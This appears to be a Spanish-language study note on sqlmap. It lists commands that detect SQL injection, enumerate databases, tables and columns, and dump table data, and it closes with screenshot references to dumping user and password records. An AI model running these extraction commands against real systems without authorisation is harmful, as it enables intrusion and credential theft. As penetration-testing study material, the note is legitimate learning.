### Guía Básica de SQLmap

`sqlmap` es una herramienta de código abierto para la detección y explotación de vulnerabilidades de inyección SQL. Aquí están algunos de los comandos más utilizados:

#### 1. **Ejecutar un Escaneo Básico**

Para realizar un escaneo básico de una URL para detectar vulnerabilidades de inyección SQL:

`sqlmap -u "http://example.com/page.php?id=1"`

- `-u [URL]`: Especifica la URL que se va a analizar.

#### 2. **Especificar Parámetros**

Si necesitas especificar parámetros adicionales (por ejemplo, parámetros de POST), usa el siguiente formato:

`sqlmap -u "http://example.com/page.php" --data="id=1&other_param=2"`

- `--data`: Utiliza esta opción para enviar datos en una solicitud POST.

#### 3. **Identificar el Tipo de Base de Datos**

Para identificar el tipo de base de datos que está detrás de la aplicación web:

`sqlmap -u "http://example.com/page.php?id=1" --dbms`

- `--dbms`: Especifica el tipo de base de datos a detectar (opcional si solo quieres detectar).

#### 4. **Enumerar Bases de Datos**

Para enumerar las bases de datos disponibles en el servidor:


`sqlmap -u "http://example.com/page.php?id=1" --dbs`

- `--dbs`: Lista todas las bases de datos disponibles.

#### 5. **Enumerar Tablas en una Base de Datos**

Para enumerar las tablas de una base de datos específica:

`sqlmap -u "http://example.com/page.php?id=1" -D [database_name] --tables`

- `-D [database_name]`: Especifica el nombre de la base de datos para listar sus tablas.
- `--tables`: Lista todas las tablas en la base de datos especificada.

#### 6. **Enumerar Columnas de una Tabla**

Para enumerar las columnas de una tabla específica en una base de datos:

`sqlmap -u "http://example.com/page.php?id=1" -D [database_name] -T [table_name] --columns`

- `-T [table_name]`: Especifica el nombre de la tabla para listar sus columnas.
- `--columns`: Lista todas las columnas en la tabla especificada.

#### 7. **Extraer Datos de una Tabla**

Para extraer datos de una tabla específica:


`sqlmap -u "http://example.com/page.php?id=1" -D [database_name] -T [table_name] --dump`

- `--dump`: Extrae y muestra los datos de la tabla especificada.

#### 8. **Especificar el Tipo de Inyección**

Para especificar el tipo de inyección que deseas usar (por ejemplo, `union`, `boolean-based`, `error-based`):


`sqlmap -u "http://example.com/page.php?id=1" --technique=U`

- `--technique=[U]`: Especifica el tipo de técnica de inyección SQL a usar (U para UNION, B para Boolean-based, E para Error-based, etc.).

#### 9. **Usar un Proxy**

Para usar un proxy (por ejemplo, Burp Suite) durante el escaneo:

`sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"`

- `--proxy`: Especifica el proxy a usar para las solicitudes.

#### 10. **Obtener Ayuda**

Para obtener ayuda sobre los comandos y opciones de `sqlmap`:

`sqlmap --help`

# Introducción a SQLMap

Parámetros Principales como la url de gestion, la cookie de sesion ya que se necesita estar logueado lo que queremos exztraer, en este caso principalmente kas bases de datos y el --batch que lo que hace es automatizar sqlmap y que no nos pregunte a cada rato acerca de confirmaciones 

![[Pasted image 20241108174501.png]]

Dumpeo de Tablas 

![[Pasted image 20241108175336.png]]

Dumpeo de Columnas 

![[Pasted image 20241108175437.png]]

Dumpeo de Usuario | Contraseña 

![[Pasted image 20241108175540.png]]


